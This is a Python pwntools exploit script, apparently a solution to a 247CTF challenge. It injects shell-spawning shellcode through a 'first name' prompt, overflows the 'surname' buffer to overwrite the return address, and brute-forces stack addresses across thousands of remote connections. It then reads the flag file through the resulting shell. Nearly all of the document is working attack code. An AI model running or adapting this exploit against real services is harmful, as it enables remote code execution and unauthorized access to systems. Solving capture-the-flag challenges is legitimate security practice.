#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

HOST = 'f7a5ee299a54c9f1.247ctf.com'
PORT = 50430

shellcode = asm(shellcraft.sh())

# Try MUCH wider range, including lower stack addresses
for page in range(0xffff0000, 0xfffff000, 0x1000):
    for offset in range(0, 0x1000, 0x10):
        addr = page + offset
        
        if addr % 0x1000 == 0:
            print(f"[*] Page 0x{addr:08x}", flush=True)
        
        try:
            p = remote(HOST, PORT, level='error')
            p.recvuntil(b"first name?\n", timeout=0.15)
            p.send(shellcode.ljust(50, b'\x90'))
            p.recvuntil(b"surname?\n", timeout=0.15)
            p.send(b'Z' * 23 + p32(addr))
            p.sendline(b'cat /flag* 2>&1')
            
            r = p.recvall(timeout=0.1)
            if b'247CTF{' in r:
                print(f"\n\n[+] FLAG FOUND at 0x{addr:08x}!\n")
                print(r.decode('latin1', errors='ignore'))
                with open('/tmp/THE_FLAG.txt', 'wb') as f:
                    f.write(r)
                sys.exit(0)
            p.close()
        except:
            pass

print("[*] Search complete")
